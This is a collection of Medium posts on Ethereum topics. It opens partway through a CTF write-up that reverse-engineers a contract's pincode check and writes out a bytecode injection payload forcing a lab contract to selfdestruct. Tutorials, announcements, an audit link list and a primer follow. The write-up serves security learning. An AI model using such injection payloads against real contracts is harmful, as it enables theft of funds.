unlock(bytes4) which corresponds to 0x75a4e3a0 .Following the flow execution by pressing s we get into the node which compares callvalue with the value 0x6f05b59d3b20000 or 500000000000000000 which is 0.5 ether:push8 0x6f05b59d3b20000callvalueltIf we supplied a necessary amount of ether, we get into a node that resembles a control structure:push1 0x4dup4push1 0xffandltiszeropush2 0x1a4jumpiIt pushes value 0x4 onto the stack, performs some bounds checks (must not be greater than 0xff) and makes lt comparison with some value that got duplicated from the 4th stack item (dup4).Scrolling to the bottom of the graph we see that this 4th item is actually an iterator and this control structure is a loop which corresponds to for(var i=0; i<4; i++):push1 0x1addswap4Looking at the loop body it is evident that it iterates over the input 4 bytes and performs some operations on each byte. Firstly, it ensures that Nth byte is greater than 0x30:push1 0x30dup3ltiszeroand then that it is lower than 0x39:push1 0x39dup3gtiszerowhich basically is a check that the byte is within 0\u20139 range. If the check succeeds, we get into the most important code block:Let\u2019s split it into the following parts:3rd element on the stack is an ASCII code of the Nth byte of the pincode. 0x30 (ASCII code of zero) is pushed onto the stack and then subtracted from the byte\u2019s code:push1 0x30dup3subWhich means pincode[i] - 48 or we basically get here the actual digit from the ASCII code, let\u2019s define it as d.2. 0x4 is pushed onto the stack and then is used as exponent for the second element on the stack which isd:swap1poppush1 0x4dup2expWhich means d ** 43. 5th element from the stack is retrieved and the result of exponentiation is added to it, let\u2019s define it as S:dup5addswap4popdup1Which means S += d ** 44. 0xa (ASCII code for 10) is pushed onto the stack and is used as a multiplier for the 7th element from the stack (6th before the push), we don\u2019t know what it is, so let\u2019s define it as U. Then d is added to the result of the multiplication:push1 0xadup7muladdswap5popWhich means: U = U * 10 + d or, simply put, this expression reconstructs the whole pincode as a number from individual bytes ([0x1, 0x3, 0x3, 0x7] \u2192 1337).We did the most difficult part, now let\u2019s proceed to the code after the loop.dup5dup5eqIf 5th and 6th elements on the stack are equal, the flow will get us to an sstore which sets some flag in the contract storage. Since this is the only sstore, this is probably what we are looking for!But how do we pass this check? As we have discovered earlier, 5th element on the stack is S and 6th element is U. Since S is a sum of each pincode digit raised to the 4th power, we need a pincode that will be equal to this sum. In our case, the code tested that 1**4 + 3**4 + 3**4 + 7**4 was not equal to 1337 and we didn\u2019t reach the winningsstore.Surely, we can now find a number that satisfies this equation. There are only three numbers that can be written as the sum of fourth powers of their digits: 1634, 8208, 9474. Any of them would unlock the lock!Pirate ShipAhoy, landlubber! The pirate ship \u201cBlack Pearl\u201d is at anchor. Make it pull the anchor and haul the black jack flag to set off for the search of treasures.The normal workflow of the contract assumed three actions:call dropAnchor() with a block number that must be greater than 100k blocks than the current one. The function dynamically creates a contract that represents \u201can anchor\u201d, which can be \u201cpulled\u201d with a selfdestruct() after the specified blockcall pullAnchor() that triggers selfdestruct() if enough time has passed (really long time!)call sailAway() that sets blackJackIsHauled to true if the anchor contract does not existThe vulnerability is quite evident: we have a direct assembly injection into a newly created contract in dropAnchor(). But the real challenge was to craft a payload that would let us pass the condition on block.number.In EVM it is possible to create contracts using create opcode. Its arguments are \u201cvalue\u201d, \u201cinput offset\u201d and \u201cinput size\u201d. Value is a bytecode that unwraps the actual contract, i.e. init code. In our case init code + code to deploy is just a uint256 (kudos to GasToken team for the idea):0x6a63004141414310585733ff600052600b6015f3where the bytes in bold is the contract code to deploy and 414141 is the injection point. Since our goal is to get rid of throw we need to inject our new contract and overwrite the trailing part of init code. Let\u2019s try to inject this new contract with 0xff which will unconditionally selfdestruct() the anchor contract:68 414141ff3f3f3f3f3f ;; push9 contract60 00                 ;; push1 052                    ;; mstore60 09                 ;; push1 960 17                 ;; push1 17f3                    ;; returnIf we convert this sequence of bytes to a uint256 (9081882833248973872855737642440582850680819) and supply it as an input to dropAnchor(), it will give us the following value of code variable (bytecode in bold is our payload):0x630068414141ff3f3f3f3f3f60005260096017f34310585733ffAfter code variable becomes part of initcode variable we get the following value:0x68414141ff3f3f3f3f3f60005260096017f34310585733ff600052600b6015f3As you see high bytes 0x6300 are gone, the trailing part containing the original bytecode is discarded after 0xf3 (return).As a result a new anchor contract with altered logic is created:41 ;; coinbase41 ;; coinbase41 ;; coinbaseff ;; selfdestruct3f ;; junk3f ;; junk3f ;; junk3f ;; junk3f ;; junkIf we now call pullAnchor(), this contract will be immediately destroyed since we don\u2019t have a condition on block.number any more. After that, the call tosailAway() will make us a winner!ResultsThe first place and 1,000 USD in Ether: Alexey Pertsev (p4lex)The second place and Ledger Nano S: Alexey KarpovThe third place and PHDays souvenirs: Alexander VlasovFull standings: https://etherhack.positive.com/#/scoreboardCongratulations to the winners and thanks to all participants!P.S. Kudos to Zeppelin for open-sourcing Ethernaut CTF platform.", "responses": 2, "tags": ["Ethereum", "Smart Contracts", "Security", "Solidity", "Reverse Engineering"]}, {"title": "Ethereum Events monitoring using Eventeum", "post_link": "https://medium.com/quiknode/ethereum-events-monitoring-using-eventeum-f81695d92e05?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2019-01-03", "last_modified_date": "2019-02-28", "readtime": "4.85", "claps": 80, "voters": 12, "content": "Ethereum Events monitoring using EventeumSmart contract monitoring made simple and scalableGaurav AgrawalFollowJan 3 \u00b7 5 min readPhoto by Gian D. on UnsplashEvent tracking on Ethereum can be very painful when you are building a Scalable Dapp. Today we are going to look at Eventeum, developed by Kauri Team.What is Eventeum?Eventeum is an Ethereum event listener service that provides a bridge between your smart contracts and middleware layer. Events subscriptions can be registered dynamically, and on emission, a message containing the details of the events are broadcast onto a message bus (currently either Kafka or RabbitMQ) which can then be consumed by your backend services.Eventeum is:Dynamically Configurable \u2014 Eventeum exposes a REST api so that smart contract events can be dynamically subscribed / unsubscribed.Highly Available \u2014 Eventeum instances communicate with each other to ensure that every instance is subscribed to the same collection of smart contract events.Resilient \u2014 Node failures are detected and event subscriptions will continue from the failure block once the node comes back online.Fork Tolerance \u2014 Eventeum can be configured to wait a certain amount of blocks before an event is considered \u2018Confirmed\u2019. If a fork occurs during this time, a message is broadcast to the network, allowing your services to react to the forked/removed event.[source]Deploying EventeumEventeum supports 3 broadcast mechanisms.KafkaHTTP PostRabbitMQWe will be using Kafka in our deployment.To deploy Eventeum, you need these things:PrerequisiteJava8MavenMongoKafkaZookeeperEthereum NodeDocker (optional)You can deploy Eventeum with or without docker. To get started I\u2019ll recommend docker all-in-one installation. It comes with all the dependencies mentioned above, though you still need to install Java8 and Maven (so install these first). I have installed both versions, with and without docker, but will mention docker all-in-one installation only as it is easy and you don\u2019t need a lot of setups.Installing Eventeum using DockerTo install Eventeum using Docker, you must have Docker and Docker-compose in your system. After installing them, follow below instructionsCheckout Eventeum Github Repo$ git clone https://github.com/ConsenSys/eventeum.gitAfter checking out the code, navigate to the root directory$ cd /path/to/eventeum/Compile, test and package the project$ mvn clean packageAll-in-one docker installation$ cd server$ docker-compose -f docker-compose.yml build$ docker-compose -f docker-compose.yml upOnce installed you can see logs in docker terminal.Note: You might need sudo depending on your docker installation.Testing EventeumFor this purpose, we will deploy a contract on our local parity node (already installed by Eventeum) and then will register an event subscription on Eventeum for Broadcasting via Kafka.Deploy contract on Local Parity nodeLet\u2019s Deploy a contract we already made in our previous tutorial. To deploy CrudApp.sol contract we will use Remix IDE and Metamask.Open Remix and add CurdApp.sol contractSelect proper compiler (0.4.23 in our case) and compile (Ignore warnings, if any \ud83d\ude03)On Metamask Select Localhost:8545In Remix, Go to Run Tab and select Web3 Provider in Environment and DeployThat\u2019s it you deployed the contract on your local Parity dev node.Register EventWe need to now Register events, so Eventeum can listen to those events and broadcast them. Eventeum exposes rest APIs for this purpose, we will use them.Register events API-URL: /api/rest/v1/event-filterMethod: POST{\t\"id\": \"event-identifier\",\t\"contractAddress\": \"0x1fbBeeE6eC2B7B095fE3c5A572551b1e260Af4d2\",\t\"eventSpecification\": {\t\t\"eventName\": \"TestEvent\",\t\t\"indexedParameterDefinitions\": [\t\t  {\"position\": 0, \"type\": \"UINT256\"},\t\t  {\"position\": 1, \"type\": \"ADDRESS\"}],\t\t\"nonIndexedParameterDefinitions\": [\t\t  {\"position\": 2, \"type\": \"BYTES32\"},\t\t  {\"position\": 3, \"type\": \"STRING\"}] },\t\"correlationIdStrategy\": {\t\t\"type\": \"NON_INDEXED_PARAMETER\",\t\t\"parameterIndex\": 0 }}To make our life simple, we will simply do a curl call. As you can see below, we are using localhost:8060 (on which, Eventeum is running) and you need to add the address for your deployed smart contract from Remix. We are currently registering CountryEvent from our smart contract which gets emitted on insert transaction.curl -X POST \\http://localhost:8060/api/rest/v1/event-filter \\-H 'Cache-Control: no-cache' \\-H 'Content-Type: application/json' \\-H 'Postman-Token: 616712a3-bf11-bbf5-b4ac-b82835779d51' \\-d '{\"id\": \"Country\",\"contractAddress\": \"ENTER_YOUR_CONTRACT_ADDRESS_CHECK_IN_REMIX\",\"eventSpecification\": {  \"eventName\": \"CountryEvent\",  \"nonIndexedParameterDefinitions\": [    {\"position\": 0, \"type\": \"STRING\"},    {\"position\": 1, \"type\": \"STRING\"},    {\"position\": 2, \"type\": \"UINT256\"}] }}'If registered successfully, you will get your ID (Country in our case) back as a response. Now Let\u2019s do an insert transaction which will emit our CountryEvent. For this purpose, we\u2019ll use Remix again, using remix, you can call your contract functions.You can see our CrudApp.sol contract address and also functions exposed by the contract, you can call it from here only.So Now, Let\u2019s put these 3 things in insert function (\u201cUSA\u201d, \u201cElizabeth Warren \u201d, 327946410), if everything went well, you will be able to see the transaction in Docker terminal.Subscribing Eventeum events in NodeJs serviceNow let\u2019s subscribe Kafka events using a NodeJs service. This will help you to a clear picture about how you can use Eventeum with your application. For this follow these steps.mkdir watchercd watchernpm initnpm installnpm i kafka-node  (Kafka-nodejs client)touch index.jsNow add below code in index.jsvar kafka = require('kafka-node')const client = new kafka.KafkaClient({kafkaHost: 'localhost:9092'});var kafka = require('kafka-node'),    Consumer = kafka.Consumer,    // client = new kafka.Client(),    consumer = new Consumer(        client,        [            { topic: 'contract-events', partition: 0 }        ],        {            autoCommit: false        }    );consumer.on('message', function (message) {    console.log(message);});You can run this usingnodejs index.jsTo test this, again do an insert transaction using remix and you will able to see console output for the event.As you can see we are using the topic as \u2018contract-events\u2019, this is already inbuilt in Eventeum, to check all the topics defined by Eventeum.bin/kafka-topics.sh --list --zookeeper localhost:2181As you are using docker installation you need to go inside the docker and run the above command, though you need to change the /bin/kafka-topics.sh with actual installation path in docker. Eventeum already create below topics__consumer_offsetsblock-eventscontract-eventsfilter-eventsfilter-events-dlteventeumfilter-events-erreventeumfilter-eventsnullHere block-events track new block generations.You can see more details here about Eventeum and learn more about it.How to Use Eventeum on TestNet or MainNet?To use Eventeum with Testnet or Mainnet you need to change Ethereum node URL in docker-compose.yml.As I am facing problem with Infura\u2019s eth_newBlockFilter api used by Eventeum, you can use QuikNode for this purpose.QuikNode provides fast Ethereum nodes, combined with Eventeum you can monitor smart contract events reliably.Please take 5 minutes to fill below this Ethereum Node Survey \ud83d\ude4f \ud83d\udc47About QuikNodeQuikNode is building infrastructure to support the future of Web3. We already worked with hundreds of companies to help them scale their Dapps and provide highly reliable Ethereum nodes. We are working on something interesting from the past few months and will be launching soon, so subscribe our newsletter for more updates!! \ud83d\ude03", "responses": 1, "tags": ["Docker", "Ethereum", "Web Development", "Web3", "Solidity"]}, {"title": "Introducing Harbour", "post_link": "https://medium.com/@deaneigenmann/introducing-harbour-55f0170bdf97?source=search_post", "author_name": "Dean Eigenmann", "author_link": "https://medium.com/@deaneigenmann", "publish_date": "2017-10-17", "last_modified_date": "2019-06-14", "readtime": "2.30", "claps": 92, "voters": 8, "content": "Introducing HarbourRebuilding GovernanceDean EigenmannFollowOct 17, 2017 \u00b7 3 min readAfter the decision to steer our project in a new direction over two months ago, the Harbour team has been working hard behind the scenes to achieve our new goals. Today, we want to share what we have been working on over the past two months: the beginning of a protocol-based governance system.One of our goals from the very beginning was to improve governance. We see it as the last, major piece of the puzzle missing from a truly complete token ecosystem. The road ahead will be pretty difficult and challenging, but we see the potential long term rewards far outweighing the difficulty of the endeavor we have full confidence in our team, advisors, and network that we will be up to the task.Our first supporters and partners come from the blockchain world, but we believe that an effective blockchain-based governance protocol will be a basic need of any type of organization. Everything from a two-person partnership to entire nations will need it.An open standard for DemocracyAs we studied governance, one thing became very clear to us: virtually all democratic forms were built using the same components. With these individual components, we can enable anyone to build any type of democratic structure they can imagine.The democratic structures themselves effectively form modules, which can be built, shared, re-imagined, and re-combined in any fashion as people choose. We eagerly await the countless iterations of modules that will arise, how they will usefully impact the organizations where they are implemented and deployed, and the organizing principles no one has yet dreamed up yet that will result.PartnershipsWith our new direction, we have already been able to generate interest from other projects building and innovating in the space. We will be announcing our active partnerships very soon, so stay tuned.New MembersUser experience and interaction will be paramount in deploying our solution, both from the developer and client perspective. We feel it is an area that is too often overlooked or given short shrift in our space. That\u2019s why we recruited two passionate new members.Samuel Furter - Samuel is our multi-talented frontend developer. He is an adept Javascript developer with excellent awareness and know-how within the Ethereum environment. We have full faith given his output so far that he is going to help us deliver an amazing product.Selim Imoberdorf - Selim is an incredibly passionate and adept frontend developer specializing in UX/UI. He has over ten years of experience spanning multiple projects and has studied interaction design extensively. He is already doing amazing work.What\u2019s next?Our team is focused on building a fully-fledged beta of our product, and we will be offering regular updates on our project status. In the coming days, we will also update our website, and release an initial draft of our whitepaper.At present, we iterate through our alpha, and getting it out to various partners in order for them to test it.Our hope in the near and long-term is that more and more people will use Harbour and see its obvious benefits in revolutionizing governance.To stay up to date with our project, check out our website and join our telegram.The Harbour TeamDean Eigenmann, Dylan Dewdney, Klajdi Ciraku, Samuel Furter & Selim Imoberdorf", "responses": 0, "tags": ["Blockchain", "Democracy", "Ethereum", "Solidity", "Announcements"]}, {"title": "Smart Contract Audit Resources & Links", "post_link": "https://medium.com/crypt-bytes-tech/smart-contract-audit-resources-links-da1cf571a80d?source=search_post", "author_name": "Priyab Dash", "author_link": "https://medium.com/@bobquest33", "publish_date": "2017-11-29", "last_modified_date": "2018-05-19", "readtime": "3.28", "claps": 30, "voters": 8, "content": "Smart Contract Audit Resources & LinksPriyab DashFollowNov 29, 2017 \u00b7 4 min readFor Anyone planning to launch ICO or want explore Smart Contract Audit, Feedback WelcomeBuilding a Marketplace for Security AuditsIncentivizing the use of Ethlance for auditing servicesblog.district0x.ioSmart Contract Security: How to Never Break the Blockchain - DZone SecurityThis article is featured in the new DZone Guide to Application and Data Security, Volume II. Get your free copy for\u2026dzone.comDevelopment, Testing And Security Audit Of The CustomerDepositFactory Smart Contract\u2190 BetterAuction Smart Contract - Testing, Security Audit, And Assisting With The Developmentwww.bokconsulting.com.auChainSecurity - Innovative Security Solutions all around BlockchainsBlockchains and smart contracts promise to automate, decentralize, and increase the transparency of many real-world\u2026chainsecurity.comSecurify \u2666 Formal Verification of Ethereum Smart ContractsAnalyse any contract for critical security vulnerabilities and insecure coding. One click only. Formal security\u2026securify.chThe Importance Of Audits And Secure Coding For Smart ContractsDecember 23, 2016 4:24 PM Making sure smart contract code is secure not only helps individual companies, it benefits\u2026www.ethnews.comNumber One smart contracts security expert to audit ChronoBankPeter Vessenes, the global blockchain and smart contracts expert who first drew attention to the vulnerability in The\u2026blog.chronobank.ioBlockchain Development Company - Smart Contracts Development - FinTechOur smart contract development and full stack blockchain development services are supported by more than 20 years of\u2026www.coinfabrik.comCoinFabrik Blog - Secure Cryptocurrency Applications DevelopmentSecure Cryptocurrency Applications DevelopmentSecure Cryptocurrency Applications Developmentblog.coinfabrik.comICO Security AuditAn audit provides an assessment of whether your organisation is following good data protection practice. We believe\u2026www.toshblocks.comJust how smart are Smart Contracts?If you haven't yet heard of a Smart Contract, just wait. You will. Using blockchain technology - a secure\u2026www.csoonline.comThinking About Smart Contract Security - Ethereum BlogOver the last day with the community's help we have crowdsourced a list of all of the major bugs with smart contracts\u2026blog.ethereum.orgGeneral Philosophy\ue3c9 Ethereum and complex blockchain programs are new and highly experimental. Therefore, you should expect constant\u2026consensys.github.ioRecommendations for Smart Contract Security in Solidity\ue3c9 This page demonstrates a number of solidity patterns which should generally be followed when writing smart contracts\u2026consensys.github.ioKnown Attacks\ue3c9 The following is a list of known attacks which you should be aware of, and defend against when writing smart\u2026consensys.github.ioSoftware Engineering Techniques\ue3c9 As we discussed in the General Philosophy section, it is not enough to protect yourself against the known attacks\u2026consensys.github.ioDocumentation and Procedures - Ethereum Smart Contract Best PracticesEdit descriptionconsensys.github.ioSecurity Tools - Ethereum Smart Contract Best PracticesEdit descriptionconsensys.github.ioSecurity Notifications - Ethereum Smart Contract Best PracticesEdit descriptionconsensys.github.ioEthereum Smart Contract Best PracticesEdit descriptionconsensys.github.ioSolidity Smart contract Security best practicesSecurity of a smart contract is more important than any other software or piece of code just because of the non\u2026lightrains.comEthereum Contract auditing(solidity)Ethereum Stack Exchange is a question and answer site for users of Ethereum, the decentralized application platform and\u2026ethereum.stackexchange.comMethodological security review of a smart contractThis is the community wiki (no reputation) answer for possible attacks and how to protect against them. Feel free to\u2026ethereum.stackexchange.comSmart Contract Security - Ethereum BlogSolidity was started in October 2014 when neither the Ethereum network nor the virtual machine had any real-world\u2026blog.ethereum.orgSmart Contract Analyzer to Debut at Ethereum Conference - CoinDeskResearchers from National University of Singapore will soon release a tool that will help ethereum users determine\u2026www.coindesk.comSmart Contract \u2014 Security AuditA detailed write up of the Sharpe Capital smart contract security audit.medium.comZeppelin: Security AuditsAt Zeppelin, we perform private and public code audits for organizations. We review your smart contracts and\u2026zeppelin.solutionsOnward with Ethereum Smart Contract SecurityIf you\u2019re new to Ethereum development, I recommend you read our Hitchhiker\u2019s Guide to Smart Contracts in Ethereum\u2026blog.zeppelin.solutionsSmartDec | Smart Contracts Security AuditWith the arrival of Smart Contracts, Application Security has become more important than ever before. Keep your code\u2026smartcontracts.smartdec.netPreparing for a Smart Contract Code AuditIf you are planning to launch a project on the Ethereum blockchain, you probably know the importance of a third-party\u2026media.consensys.netSmart Contracts Security, Pt. 1This series of texts is dedicated to analysing smart contract security. In the following sections, we explain what\u2026blog.smartdec.netTrust No One: Ethereum Smart Contract Security Is Advancing - CoinDesk\"Everyone here is a target for attack. Be paranoid.\" That's how Ethereum Foundation security lead Martin Swende ended\u2026www.coindesk.comThe ultimate guide to audit a Smart Contract + Most dangerous attacks in SolidityHave you ever wondered how to audit a Smart Contract to find security breaches?medium.comTokenLot - Your ICO SuperstoreIn order to navigate the constantly changing regulatory landscape of emerging technologies, sound advice from a trusted\u2026www.tokenlot.comIf you have any good resources, please do share in the comment below, will add them.Disclaimer: This is not investment or trading advice, always do your own independent research.If you like the Blog then please help support the publication viahttps://www.patreon.com/cryptbytestech. Also you can send some eth contributions to 0x670A8721C343Ce16D619630283Ea70F3235e3247If you have a story please join the telegram channels and share with us Joinhttps://t.me/joinchat/AsCHKQ8-wkEQYo5BXDQgZQ.If you want to explore more on Cryptos visit -> https://cryptoprofile.comSolidified - Audit Platform for Smart ContractsA platform for crowd-sourced review of smart contracts, where any developer can bring their contract for review with a\u2026www.solidified.ioTurnkey ICO SecurityFull Spectrum ICO Protectionwww.iosiro.com", "responses": 2, "tags": ["Ethereum", "Smart Contracts", "Solidity", "Security"]}, {"title": "The Batch Overflow Bug, and Why Your Trustcoins and WeTrust Financial dApps Are Safe", "post_link": "https://blog.wetrust.io/the-batch-overflow-bug-and-why-your-trustcoins-and-wetrust-financial-dapps-are-safe-2e8af266e3fa?source=search_post", "author_name": "WeTrustLeonD", "author_link": "https://blog.wetrust.io/@WeTrustLeonD", "publish_date": "2018-04-30", "last_modified_date": "2018-06-21", "readtime": "2.91", "claps": 206, "voters": 11, "content": "The Batch Overflow Bug, and Why Your Trustcoins and WeTrust Financial dApps Are SafeWeTrustLeonDFollowApr 30, 2018 \u00b7 3 min readRecently, a Batch Overflow bug affecting ERC20 tokens has shut down trading on many cryptocurrency exchanges. Rest assured that your TRST tokens and financial dApps are not affected by this bug. Read on for a brief overview of this pesky bug, and why it doesn\u2019t affect WeTrust\u2019s products.The Batch Overflow bug occurs due to a Batch Transfer function call that is not part of the original ERC20 standard. The function in question performs a multiply that is able to overflow 256 bits, the maximum allowed value in an ERC20 token. Essentially, Ethereum allows developers to track up to (2\u00b2\u2075\u2076-1) values. That\u2019s a value larger than the number 1 with 77 zeros following it! However, certain calculations can result in a value greater than the maximum allowed value. At that point, the Ethereum computer responds by dropping the largest digit and keeping only the lower digits.As an example, imagine you have a computer that only allows you to have numbers up to five digits (i.e. up to 99,999). Say you are trying to multiply two of them:510x300\u2014 \u2014 \u2014 \u2014153,000The result of the multiplication is the number 153,000, but we just said our computer can only handle numbers up to five digits. That means the sixth digit, the 1, gets dropped, leaving us with 53,000. Imagine the same thing happening with binary values (that is, numbers represented using only 0\u2019s or 1\u2019s) that can be up to 256 bits long, and you see how ERC20 tokens can overflow and behave in unintended ways.To prevent these overflow situations from occuring, developers often use the Solidity safeMath library, provided as an open source library by OpenZeppelin. safeMath checks to make sure that the result of any calculation is correct and that no overflow has occurred. It does this by dividing the result of any multiplication by one of the original multipliers, by making sure the result of any addition is larger than the original values, and by checking that no negative numbers can result from a subtraction.In the case of the Batch Overflow bug, a piece of code multiplied two numbers without using safeMath to check the correctness of the multiplication. The code was intended to allow a Batch Transfer, in which a certain amount of tokens can be transferred to multiple wallets with a single transaction, saving gas in the process. The code seems to have been copied and pasted by multiple developers, exposing a variety of tokens to the bug. In this case, the overflow can allow an unscrupulous person to create additional instances of the affected tokens \u201cout of thin air\u201d, allowing them to counterfeit the buggy tokens.WeTrust\u2019s TRST tokens and Trusted Lending Circles are NOT affected by this bug. Our hardworking software development team takes security very seriously, and has made sure that both our tokens and the products powered by them are not susceptible to these type of hacks.Our users are protected from this bug because:TRST is an ERC20 token, but DOES NOT implement the non-standard Batch Transfer function that causes this bug.We do not perform any multiply that can lead to overflows in our transfer functions. In fact, we don\u2019t perform any multiplies in our token code at all! All of the token transactions occur as additions.In our Trusted Lending Circles Smart Contract, we always validate the results of our calculations with the same safeMath assertions. If the result is false, the Smart Contract will throw an error.Our Smart Contracts have all been independently audited by security firms, including Quantstamp, ABDK, and OpenZeppelin, the creators of the safeMath library.When implemented the right way, blockchain technology is highly secure and incredibly difficult to hack. However, writing secure code on the blockchain requires a great deal of care and discipline. Bugs such as Batch Overflow emphasize the importance of taking proactive measures to keep decentralized applications safe.As the blockchain ecosystem matures, we expect to see the emergence of more tools, techniques and best practices for security. Keeping our Smart Contracts safe requires extra work from our software developers and our outside auditors, but it\u2019s absolutely worth it to create products that our customers can completely TRUST.", "responses": 0, "tags": ["Blockchain", "Ethereum", "Blockchain Technology", "Solidity", "Cybersecurity"]}, {"title": "Meritocratic ICO Bonus Based on the WINGS Forecast Rating (FR) Reputation Score", "post_link": "https://blog.wings.ai/meritocratic-ico-bonus-based-on-the-wings-forecast-rating-fr-reputation-score-47d492b4c4f7?source=search_post", "author_name": "WINGS Magazine", "author_link": "https://blog.wings.ai/@wings.ai", "publish_date": "2018-05-25", "last_modified_date": "2018-06-20", "readtime": "2.57", "claps": 40, "voters": 10, "content": "Meritocratic ICO Bonus Based on the WINGS Forecast Rating (FR) Reputation ScoreWINGS MagazineFollowMay 25, 2018 \u00b7 3 min readThe Goose That Laid The Golden EggBased on text and code repo at https://github.com/WingsDao/fr-bonusIntroductionOver the last 5 years since the first ICO, Mastercoin, it has been popular to award discounts or bonuses to ICO participants based on time or volume. Early time participation could be a measure of how socially connected a participant is in the crypto-economy, and volume could be a measure of how lucky the participant was in winning the womb lottery. But Ethereum allows us to do much more especially to level the planing field for people who are in areas of the world that do not allow them to easily connect with the Silicon Valley elites.In this article we introduce a new method of bonus based on what we believe can be used as a proxy for analytical intelligence \u2014 the ability to forecast sales outcomes.Each forecaster on WINGS has a Forecast Rating (FR) which is a reputation score based on the ability to accurately forecast the sale of tokens or coins in a crowdfunding event, this score can be increasing or decreasing with time based decay and forecasts accuracy. Based on this FR we can give additional bonus to people, who hold have high FR scores.The WINGS FR score hypothetically is a proxy for effort and analytical capability as it is rewarded for from high participation in evaluating ICOs and consistent ability to predict sales outcomes. Simply put it is a key performance metric for ranking personnel or algorithms (we do not assume that all WINGS forecasters are \u201cpeople\u201d) in a decentralized sales forecasting organization.The repo contains explanations on how to give a bonus for such participants, including a library that calculates bonus based on max FR (you can find the current max FR on this community run FR list portal), participant FR and max bonus.To get more details see examples.InstallationRequirements:NodejsTruffleRPC Node (Testrpc/Parity/Get)Installation with NPM:npm install fr-bonusTestsLaunch:USER_STORAGE=0x94B2F026A75BE2556C78A6D1f573bD79Fdfb1962  truffle testImportant: Test Example.js won\u2019t work without providing User storage contract address, use default User Storage address on mainnet: 0x94B2F026A75BE2556C78A6D1f573bD79Fdfb1962.MigrationsStandard truffle migrations, see details in migrations folder.ExamplesHere we describe how to integrate FRBonus lib into a token sale or ICO contract, making it possible to give bonus based on FR.First add FRBonus library to your smart contracts, let\u2019s do it with npm:npm install fr-bonusOnce installed do an import of FRBonus library and IUserStorage interface into your smart contracts:import \"./IUserStorage.sol\";import \"./FRBonus.sol\";So in our libraries and contracts we now have:FRBonus:getBonus(uint64 _maxFr, uint64 _usrFR, uint256 _maxBonus) public returns (uint256) - Function that returns bonus, based on maximum FR (you can take it from FR list portal), user FR (take from IUserStorage), and max bonus you are ready to provide (in percents, e.g. 1%-100%). Returns bonus in percent.IUserStorage:getFR(address _account) public constant returns(uint64 FR) - Takes user account address and returns FR of this account.Important: IUserStorage interface should be initialize by User Storage address deployed on Ethereum\u2019s mainnet network. The address is: 0x94B2F026A75BE2556C78A6D1f573bD79Fdfb1962.Let\u2019s try to add it to our code like so:uint256 public maxFRBonus = 20; // Max bonus we are ready to allocateuint64 public maxFR = 771; // Maximum FR take from FR list portal - https://wings-utilities.com/uint256 bonus = FRBonus.getBonus(maxFR, IUserStorage(userStorage).getFR(msg.sender), maxFRBonus); // take a bonus, will be some percent %.This is how we get the FR of a participant:IUserStorage(userStorage).getFR(msg.sender)userStorage is address and should be: 0x94B2F026A75BE2556C78A6D1f573bD79Fdfb1962.That\u2019s all. Now you can use your bonus to increase allocation of tokens for ICO participants based on how how much WINGS FR they have achieved.For more details look at our example contracts.LicenseMIT.", "responses": 0, "tags": ["Blockchain", "ICO", "Ethereum", "Solidity", "Erc20"]}, {"title": "What is blockchain: A basic primer", "post_link": "https://medium.com/@mattburgess/what-is-blockchain-a-basic-primer-775d72b353e5?source=search_post", "author_name": "Matt Burgess", "author_link": "https://medium.com/@mattburgess", "publish_date": "2017-10-07", "last_modified_date": "2018-04-19", "readtime": "9.15", "claps": 29, "voters": 9, "content": "What is blockchain: A basic primerBitcoins, Ethereum and other blockchain applications seem to be all the rage right now. So what the hell actually is it?Matt BurgessFollowOct 7, 2017 \u00b7 10 min readAfter I first learned of the Baader-Meinhof effect, I started noticing people mentioning it all the time.Dumb jokes aside, it\u2019s that thing that happens where you hear about something \u2013 an obscure band or a type of wood, or god knows what, and now you hear it all over the place. That can make it hard to tell whether you\u2019re only just now hyper-attuned to any mention of a previously common term, or whether it\u2019s actually becoming a thing.Blockchain is one of them. If you\u2019re anything like me (and if you are, congratulations) you\u2019re hearing about blockchains all over the place. I started doing a little bit of work in that space lately, and it forced me to look into it.What I discovered is a world of relatively simple principles, clouded by assumed knowledge and arcane terminology. Blockchain applications combine all the jargon of IT with the insider knowledge of the finance and trading industry. Add in some advanced cryptography and baby you got a stew going.The point of this article is to penetrate some of that. This is written from a developer and interested party point of view. And actually, let\u2019s make something very clear right up front.This article is not about trading or buying BitcoinThis article is actually about the underlying technology, the overlaying terminology, and its applications. It is intended to answer often unasked questions about what blockchain actually means and how it works.Let\u2019s start at the beginning. Fundamentally, a blockchain is no more or less than a ledger, a list of transactions. That list is agreed on by mechanisms to determine consensus, which makes it \u201cofficial\u201d.You see, blockchain technologies are \u201cdistributed\u201d. There\u2019s no central list of transactions. There are a huge number of \u201cledger keepers\u201d on the network, all of whom have equal access to the network and the transactions in it. That means everyone needs to agree on what are the correct transactions, and (most critically) in what order. With a distributed system, transactions can be put into the system in any order and retrieved in any order. This order very much matters.If Joan sends $80 to Steven, and $70 to Chen, but she only has $100 then we have a problem. Whichever one she sent money to first gets paid. Whoever was sent the second doesn\u2019t \u2013 that transaction is invalid. If one person says Jeff got paid first and another says Steven did, there is a conflict.The way it works out is surprisingly simple. Every one of the ledger keepers has access to a pool of pending transactions. They grab whatever transactions they want out of that pool, and make them into a collection up to a certain amount of space and that\u2019s called a Block. See where this is going?From there, every ledger keeper tries to claim their block is the correct block. The official order. But there can be only one and they have to fight for it. The way they fight is where the crypto in cryptocurrencies comes from. (I\u2019ll let you figure out what \u201ccurrencies\u201d means on your own time.)Blockchain cryptography vastly oversimplifiedBecause there can be only one block officially chosen, each ledger keeper has to work for the right to be that one. As a result, they\u2019re asked to do a puzzle. In actual fact they\u2019re asked to solve elliptic curve cryptography, but that\u2019s hard to explain for three reasons: I don\u2019t understand it, I don\u2019t care, you don\u2019t care.A good analog to the puzzles is something like Sudoku. Sudoku follows very simple rules. You can only have the numbers 1 \u2013 9, and they can\u2019t conflict among rows, columns, or 3x3 grid squares. Most critically, solving a Sudoku puzzle is difficult and time-consuming, but confirming that it is solved is a piece of cake. You just scan over it to confirm it didn\u2019t break any rules and it should all be good.Analogically, the ledger keepers don\u2019t \u201csolve\u201d the sudoku by actually figuring it out like you or I would. There\u2019s no puzzling or logic. They just slam numbers into it and hope it\u2019s right. When it\u2019s not, they try more numbers. Over and over until they get one right. With a lot of attempts, by design it takes about 10 minutes for someone to get one right somewhere in the world.An aside for number geeks \u2014 normal people please ignoreOur Sudoku grid here is not a 9x9 grid but something just over 150,000,000,000 x 150,000,000,000.Solution attempts are being made at the rate of five million trillion tries a second. That is not a typo, it\u2019s around 5,000,000 